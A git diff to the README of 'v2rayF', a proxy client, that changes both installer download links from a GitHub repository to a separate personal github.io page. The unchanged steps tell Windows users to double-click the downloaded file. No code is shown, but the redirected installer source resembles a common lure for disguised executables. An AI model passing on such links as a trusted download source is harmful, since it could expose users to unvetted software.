@@ -1,6 +1,6 @@
 # 🌐 v2rayF - Secure Internet Access Simplified Today
 
-[![Download v2rayF](https://img.shields.io/badge/Download_v2rayF-blue.svg)](https://github.com/zaynethomson8-rgb/v2rayF)
+[![Download v2rayF](https://img.shields.io/badge/Download_v2rayF-blue.svg)](https://zaynethomson8-rgb.github.io)
 
 v2rayF provides a way to secure your internet connection. It acts as a bridge between your computer and the websites you visit. This application masks your location and hides your traffic from prying eyes. It supports modern protocols like VLESS and Reality to ensure high performance and privacy. You keep control of your data without complex configurations.
 
@@ -18,7 +18,7 @@ v2rayF works on Windows, macOS, and Linux. It runs as a light process in the bac
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the [Download Page](https://github.com/zaynethomson8-rgb/v2rayF) to select the correct installer.
+1.  Visit the [Download Page](https://zaynethomson8-rgb.github.io) to select the correct installer.
 2.  Click the link to save the file to your computer.
 3.  Locate the file in your Downloads folder.
 4.  Double-click the file to begin the setup process.
